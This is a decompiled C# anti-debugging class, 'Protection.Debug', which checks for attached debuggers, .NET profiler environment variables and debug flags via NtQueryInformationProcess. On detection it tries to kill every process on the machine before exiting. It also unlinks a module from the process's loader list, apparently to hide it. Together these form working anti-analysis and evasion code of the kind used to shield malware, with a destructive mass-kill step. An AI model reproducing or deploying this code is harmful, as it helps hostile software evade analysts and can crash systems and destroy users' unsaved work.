using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace Protection
{
	// Token: 0x02000002 RID: 2
	internal static class Debug
	{
		// Token: 0x06000001 RID: 1
		[DllImport("ntdll.dll", CharSet = CharSet.Auto)]
		public static extern int NtQueryInformationProcess(IntPtr test, int test2, int[] test3, int test4, ref int test5);

		// Token: 0x06000002 RID: 2 RVA: 0x00002630 File Offset: 0x00000830
		public static void Initialize()
		{
			bool flag = Debugger.IsLogging();
			if (flag)
			{
				Thread.Sleep(120);
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					try
					{
						process.PriorityClass = ProcessPriorityClass.BelowNormal;
						process.Kill();
					}
					catch
					{
					}
				}
				Environment.Exit(0);
			}
			bool isAttached = Debugger.IsAttached;
			if (isAttached)
			{
				Thread.Sleep(120);
				Process[] processes2 = Process.GetProcesses();
				foreach (Process process2 in processes2)
				{
					try
					{
						process2.PriorityClass = ProcessPriorityClass.BelowNormal;
						process2.Kill();
					}
					catch
					{
					}
				}
				Environment.Exit(0);
			}
			bool flag2 = Environment.GetEnvironmentVariable("complus_profapi_profilercompatibilitysetting") != null;
			if (flag2)
			{
				Thread.Sleep(120);
				Process[] processes3 = Process.GetProcesses();
				foreach (Process process3 in processes3)
				{
					try
					{
						process3.PriorityClass = ProcessPriorityClass.BelowNormal;
						process3.Kill();
					}
					catch
					{
					}
				}
				Environment.Exit(0);
			}
			bool flag3 = string.Compare(Environment.GetEnvironmentVariable("COR_ENABLE_PROFILING"), "1", StringComparison.Ordinal) == 0;
			if (flag3)
			{
				Thread.Sleep(120);
				Process[] processes4 = Process.GetProcesses();
				foreach (Process process4 in processes4)
				{
					try
					{
						process4.PriorityClass = ProcessPriorityClass.BelowNormal;
						process4.Kill();
					}
					catch
					{
					}
				}
				Environment.Exit(0);
			}
			bool flag4 = Environment.OSVersion.Platform != PlatformID.Win32NT;
			if (!flag4)
			{
				int[] array5 = new int[6];
				int num = 0;
				IntPtr intPtr = Process.GetCurrentProcess().Handle;
				bool flag5 = Debug.NtQueryInformationProcess(intPtr, 31, array5, 4, ref num) == 0 && array5[0] != 1;
				if (flag5)
				{
					Thread.Sleep(120);
					Process[] processes5 = Process.GetProcesses();
					foreach (Process process5 in processes5)
					{
						try
						{
							process5.PriorityClass = ProcessPriorityClass.BelowNormal;
							process5.Kill();
						}
						catch
						{
						}
					}
					Environment.Exit(0);
				}
				bool flag6 = Debug.NtQueryInformationProcess(intPtr, 30, array5, 4, ref num) == 0 && array5[0] != 0;
				if (flag6)
				{
					Thread.Sleep(120);
					Process[] processes6 = Process.GetProcesses();
					foreach (Process process6 in processes6)
					{
						try
						{
							process6.PriorityClass = ProcessPriorityClass.BelowNormal;
							process6.Kill();
						}
						catch
						{
						}
					}
					Environment.Exit(0);
				}
				bool flag7 = Debug.NtQueryInformationProcess(intPtr, 0, array5, 24, ref num) != 0;
				if (!flag7)
				{
					intPtr = Marshal.ReadIntPtr(Marshal.ReadIntPtr((IntPtr)array5[1], 12), 12);
					Marshal.WriteInt32(intPtr, 32, 0);
					IntPtr intPtr2 = Marshal.ReadIntPtr(intPtr, 0);
					IntPtr ptr = intPtr2;
					do
					{
						ptr = Marshal.ReadIntPtr(ptr, 0);
						bool flag8 = Marshal.ReadInt32(ptr, 44) != 1572886 || Marshal.ReadInt32(Marshal.ReadIntPtr(ptr, 48), 0) != 7536749;
						if (!flag8)
						{
							IntPtr intPtr3 = Marshal.ReadIntPtr(ptr, 8);
							IntPtr intPtr4 = Marshal.ReadIntPtr(ptr, 12);
							Marshal.WriteInt32(intPtr4, 0, (int)intPtr3);
							Marshal.WriteInt32(intPtr3, 4, (int)intPtr4);
						}
					}
					while (!ptr.Equals(intPtr2));
				}
			}
		}
	}
}
